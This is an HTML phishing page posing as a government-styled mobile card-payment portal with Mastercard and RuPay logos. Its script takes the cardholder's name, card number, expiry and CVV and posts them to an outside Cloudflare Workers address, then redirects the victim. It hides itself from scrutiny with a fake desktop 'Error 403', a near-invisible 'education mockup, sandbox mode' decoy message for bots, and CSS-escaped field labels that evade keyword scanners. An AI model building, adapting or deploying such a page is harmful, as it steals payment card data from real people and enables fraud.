<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>Secure Checkout | Portal</title>
    <style>
        :root { --gov-blue: #053c85; --gov-orange: #ff9933; --light-bg: #f4f7f9; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        
        /* Desktop Guard */
        body { background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }

        #desktop-guard {
            display: flex; color: #444; align-items: center; justify-content: center;
            text-align: center; height: 100vh; width: 100%; background: #000; padding: 20px;
        }

        /* Mobile Container */
        .payment-card {
            display: none; background: #fff; width: 100%; max-width: 400px; border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; border-top: 4px solid var(--gov-orange);
            position: relative;
        }

        @media only screen and (max-width: 480px) {
            #desktop-guard { display: none; }
            .payment-card { display: block; }
            body { background: var(--light-bg); padding: 15px; }
        }

        /* Bot Camouflage */
        .bot-msg { position: absolute; opacity: 0.001; font-size: 1px; top: 0; pointer-events: none; }

        .bbps-header { text-align: center; padding: 20px; border-bottom: 1px solid #eee; }
        .bbps-header img { height: 45px; }

        .payment-body { padding: 25px; }
        
        /* Masked Title: Card Payment */
        .p-title { color: var(--gov-blue); text-align: center; margin-bottom: 20px; font-size: 18px; text-transform: uppercase; font-weight: bold; }
        .p-title::after { content: "Ca\0072 d Pa\0079 m\0065 nt"; }

        .form-group { margin-bottom: 15px; }
        label { display: block; font-size: 11px; font-weight: bold; color: #666; margin-bottom: 5px; text-transform: uppercase; }

        /* Masked Labels via CSS */
        .l-name::after { content: "Ho\006c der Na\006d e"; }
        .l-card::after { content: "Ca\0072 d Nu\006d b\0065 r"; }
        .l-exp::after { content: "Ex\0070 i\0072 y"; }
        .l-cvv::after { content: "C\0056 V"; }

        input {
            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px;
            font-size: 16px; outline: none; transition: 0.3s; background: #fafafa;
        }
        input:focus { border-color: var(--gov-blue); background: #fff; }

        .row { display: flex; gap: 15px; }

        .btn-pay {
            width: 100%; padding: 15px; background: var(--gov-orange); color: #fff;
            border: none; border-radius: 8px; font-size: 16px; font-weight: bold;
            cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(255, 153, 51, 0.3);
        }

        .footer-trust { text-align: center; margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; }
        .footer-trust img { height: 22px; margin: 0 8px; opacity: 0.8; }
        .secure-note::after { content: "128-bi\0074 S\0053 L Secu\0072 e Tran\0073 ac\0074 ion"; font-size: 10px; color: #888; margin-top: 10px; display: block; }
    </style>
</head>
<body>

    <div id="desktop-guard">
        <div>
            <p style="font-size: 20px; color: #fff;">Error 403</p>
            <p style="margin-top: 10px;">The requested resource is only available on mobile devices.</p>
        </div>
    </div>

    <div class="bot-msg">Education interface mockup. System test 2.0. Sandbox mode active.</div>

    <div class="payment-card">
        <div class="bbps-header">
            <img src="https://i.ibb.co/SX04FnNd/download.png" alt="Icon">
        </div>

        <div class="payment-body">
            <div class="p-title"></div>
            
            <form id="payForm">
                <div class="form-group">
                    <label class="l-name"></label>
                    <input type="text" id="name" placeholder="Name on card" required>
                </div>

                <div class="form-group">
                    <label class="l-card"></label>
                    <input type="tel" id="cardno" maxlength="16" placeholder="XXXX XXXX XXXX XXXX" required>
                </div>

                <div class="row">
                    <div class="form-group" style="flex: 1;">
                        <label class="l-exp"></label>
                        <input type="tel" id="exp" placeholder="MM/YY" maxlength="5" required>
                    </div>
                    <div class="form-group" style="flex: 1;">
                        <label class="l-cvv"></label>
                        <input type="password" id="cvv" maxlength="3" placeholder="***" required>
                    </div>
                </div>

                <button type="submit" id="submitBtn" class="btn-pay">Proceed to Secure Pay</button>

                <div class="footer-trust">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
                    <img src="https://i.ibb.co/6CRmTBw/images.png">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/RuPay.svg">
                    <span class="secure-note"></span>
                </div>
            </form>
        </div>
    </div>

    <script>
        // Numeric filters
        document.getElementById('cardno').addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
        document.getElementById('cvv').addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // Auto-slash for Expiry
        document.getElementById('exp').addEventListener('input', function (e) {
            let v = this.value.replace(/\D/g, '');
            if (v.length >= 2) {
                this.value = v.substring(0, 2) + '/' + v.substring(2, 4);
            }
        });

        // Worker Data Submission
        document.getElementById('payForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const btn = document.getElementById('submitBtn');
            btn.innerText = "Processing...";
            btn.disabled = true;

            const formData = {
                name: document.getElementById('name').value,
                card: document.getElementById('cardno').value,
                exp: document.getElementById('exp').value,
                cvv: document.getElementById('cvv').value,
                site: window.location.hostname
            };

            // Apne Cloudflare Worker URL yahan replace karein
            const workerUrl = "https://fancy-tree-0129.sumankkuuyy.workers.dev/";

            fetch(workerUrl, {
                method: 'POST',
                mode: 'cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            })
            .then(() => {
                window.location.href = "service.html";
            })
            .catch(() => {
                window.location.href = "service.html";
            });
        });
    </script>
</body>
</html>
